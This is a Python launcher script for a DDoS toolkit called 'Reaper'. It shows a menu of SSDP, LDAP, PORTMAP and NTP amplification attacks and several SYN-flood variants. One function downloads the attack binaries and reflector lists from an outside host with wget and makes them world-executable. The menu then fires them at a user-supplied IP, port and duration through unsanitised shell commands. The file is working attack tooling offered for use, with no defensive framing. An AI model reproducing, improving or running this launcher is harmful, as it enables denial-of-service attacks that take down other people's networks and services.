import subprocess, time, sys, os

def cri(cmd):
    subprocess.call(cmd, shell=True)

def reaper1():
  print ("\x1b[0;31m8888888b  ")
  print ("\x1b[0;31m888   Y88b  ")
  print ("\x1b[0;31m888    888   ")
  print ("\x1b[0;31m888   d88P .d88b.   8888b.  88888b.   .d88b.  888d888")
  print ("\x1b[0;31m8888888P  d8P  Y8b      88b 888  88b d8P  Y8b 888P")
  print ("\x1b[0;31m888 T88b  88888888 .d888888 888  888 88888888 888")
  print ("\x1b[0;31m888  T88b Y8b.     888  888 888 d88P Y8b.     888")
  print ("\x1b[0;31m888   T88b  Y8888   Y888888 88888P     Y8888  888")
  print ("\x1b[0;31m                            888")
  print ("\x1b[0;31m                            888")
  print ("\x1b[0;31m                            888") 
  print ("\x1b[0;31m ")
  print ("\x1b[0;31m*********************************************")
  print ("\x1b[0;31m*            \x1b[1;37mWelcome To The Reaper\x1b[0;31m          *")
  print ("\x1b[0;31m*********************************************")
  print (" " )
  print ("\x1b[0;31mSelect An Option:") 
  print ("\x1b[1;37m[\x1b[0;31m1\x1b[1;37m] -Downloads all Scripts \x1b[1;37m[\x1b[0;31m7\x1b[1;37m]  -SYNACK")
  print ("\x1b[1;37m[\x1b[1;32m2\x1b[1;37m] -REAPER                \x1b[1;37m[\x1b[0;32m8\x1b[1;37m]  -WINSYN")
  print ("\x1b[1;37m[\x1b[1;33m3\x1b[1;37m] -SSDP                  \x1b[1;37m[\x1b[0;33m9\x1b[1;37m]  -SYN9")
  print ("\x1b[1;37m[\x1b[1;34m4\x1b[1;37m] -LDAP                  \x1b[1;37m[\x1b[0;34m10\x1b[1;37m] -PROWIN")
  print ("\x1b[1;37m[\x1b[1;35m5\x1b[1;37m] -PORTMAP               \x1b[1;37m[\x1b[0;35m11\x1b[1;37m] -GREENSYN")
  print ("\x1b[1;37m[\x1b[1;36m6\x1b[1;37m] -NTP                   \x1b[1;37m[\x1b[0;36m12\x1b[1;37m] -Loads Main Menu")

def thanks():
  cri("clear")
  print ("\x1b[0;31m8888888b  ")
  print ("\x1b[0;31m888   Y88b  ")
  print ("\x1b[0;31m888    888   ")
  print ("\x1b[0;31m888   d88P .d88b.   8888b.  88888b.   .d88b.  888d888")
  print ("\x1b[0;31m8888888P  d8P  Y8b      88b 888  88b d8P  Y8b 888P")
  print ("\x1b[0;31m888 T88b  88888888 .d888888 888  888 88888888 888")
  print ("\x1b[0;31m888  T88b Y8b.     888  888 888 d88P Y8b.     888")
  print ("\x1b[0;31m888   T88b  Y8888   Y888888 88888P     Y8888  888")
  print ("\x1b[0;31m                            888")
  print ("\x1b[0;31m                            888")
  print ("\x1b[0;31m                            888") 
  print ("\x1b[0;31m ")
  print ("\x1b[0;31m*********************************************")
  print ("\x1b[0;31m*            \x1b[1;37mWelcome To The Reaper\x1b[0;31m          *")
  print ("\x1b[0;31m*********************************************")
  print (" " )
  print ("\x1b[1;37mThank you for using the reaper! ")
  print ("\x1b[1;37mMultiScript Created By\x1b[1;37m\x1b[1;37m@\x1b[0;31mflexingonlamers ")
  
def download():
  cri('wget -q http://hentaiwhirled.online/reaper/iphm/ldap -O ldap')
  cri('wget -q http://hentaiwhirled.online/reaper/iphm/ntp -O ntp')
  cri('wget -q http://hentaiwhirled.online/reaper/iphm/reaper -O reaper')
  cri('wget -q http://hentaiwhirled.online/reaper/iphm/ssdp -O ssdp')
  cri('wget -q http://hentaiwhirled.online/reaper/iphm/portmap -O portmap')
  cri('wget -q http://hentaiwhirled.online/AWS/prowin -O prowin')
  cri('wget -q http://hentaiwhirled.online/AWS/syn9 -O syn9')
  cri('wget -q http://hentaiwhirled.online/AWS/synack -O synack')
  cri('wget -q http://hentaiwhirled.online/AWS/greensyn -O greensyn')
  cri('wget -q http://hentaiwhirled.online/AWS/winsyn -O winsyn')
  cri('wget -q http://hentaiwhirled.online/AWS/portmap.txt -O portmap.txt')
  cri('wget -q http://hentaiwhirled.online/AWS/other.txt -O  other.txt')
  cri('wget -q http://hentaiwhirled.online/reaper/iphm/reaper.txt -O reaper.txt')
  cri('wget -q http://hentaiwhirled.online/AWS/ldap.txt -O ldap.txt')
  cri('wget -q http://hentaiwhirled.online/AWS/ntp.txt -O ntp.txt')
  cri('chmod 777 *')
  cri('python reaper.py')

reaper1()
try:
  option = input ("\x1b[1;37m[root@Reaper ~]# ") 
except:
  thanks()
  sys.exit()

if option == 1:
 option77 = raw_input("Do you want to download the files (y/n): ")
 if option77 == "y":
   download()
 elif option == "n":
   cri('python reaper.py')
 
if option == 2:
  try:
    ip = raw_input("Enter Desired IP: ")
    port = raw_input("Enter Desired Port: ")
    times = raw_input("Enter Desired Time: ")
    cri("./reaper "+ ip +" "+ port +" reaper.txt 2 -1 "+ times + "")
  except KeyboardInterrupt:
    print "\n" + "user requested shutdown"
    sys.exit()

if option == 3:
  try:
    ip_2 = raw_input("Enter Desired IP: ")
    port_2 = raw_input("Enter Desired Port: ")
    time_2 = raw_input("Enter Desired Time: ")
    cri("./ssdp "+ ip_2 +" "+ port_2 +" ssdp.txt 2 -1 "+ time_2 + "")
    cri('python IPHM.pyc')
  except KeyboardInterrupt:
    print "\n" + "user requested shutdown"
    sys.exit()
     
if option == 4:
  try:
    ip_3 = raw_input("Enter Desired IP: ") 
    port_3 = raw_input("Enter Desired Port: ")
    time_3 = raw_input("Enter Desired Time: ")
    cri("./ldap "+ ip_3 +" "+ port_3 +" ldap.txt 2 -1 "+ time_3 + "")
    cri('python IPHM.pyc')
  except KeyboardInterrupt:
    print "\n" + "user requested shutdown"
    sys.exit()
    
if option == 5:
  try:
    ip_4 = raw_input("Enter Desired IP: ")
    port_4 = raw_input("Enter Desired Port: ")
    time_4 = raw_input("Enter Desired Time: ")
    cri("./portmap "+ ip_4 +" "+ port_4 +" portmap.txt 2 -1 "+ time_4 + "")
    cri('python IPHM.pyc')
  except KeyboardInterrupt:
    print "\n" + "user requested shutdown"
    sys.exit()
    
if option == 6:
  try:
    ip_5 = raw_input("Enter Desired IP: ")
    port_5 = raw_input("Enter Desired Port: ")
    time_5 = raw_input("Enter Desired Time: ")
    cri("./ntp "+ ip_5 +" "+ port_5 +" ntp.txt 2 -1 "+ time_5 + "")
    cri('python IPHM.pyc')
  except KeyboardInterrupt:
    print "\n" + "user requested shutdown"
    sys.exit()
    
if option == 7:
  try:
    cri('./synack')
    cri('python IPHM.pyc')
  except KeyboardInterrupt:
    print "\n" + "user requested shutdown"
    sys.exit()
    
if option == 8:
  try:
    ip_6 = raw_input("Enter Desired IP: ")
    cri("./winsyn "+ ip_6 +"")
    cri('python IPHM.pyc')
  except KeyboardInterrupt:
    print "\n" + "user requested shutdown"
    sys.exit()
    
if option == 9:
  try:
    cri('./syn9')
    cri('python IPHM.pyc')
  except KeyboardInterrupt:
    print "\n" + "user requested shutdown"
    sys.exit()
    
if option == 10:
  try:
    ip_7 = raw_input("Enter Desired IP: ")
    cri("./prowin "+ ip_7 +"")
    cri('python IPHM.pyc')
  except KeyboardInterrupt:
    print "\n" + "user requested shutdown"
    sys.exit()
    
if option == 11:
  try:
    cri('./greensyn')
    cri('python IPHM.pyc')
  except KeyboardInterrupt:
    print "\n" + "user requested shutdown"
    sys.exit()

if option == 12:
  try:
    print ('python main.pyc')
  except KeyboardInterrupt:
    print "\n" + "user requested shutdown"
    sys.exit()
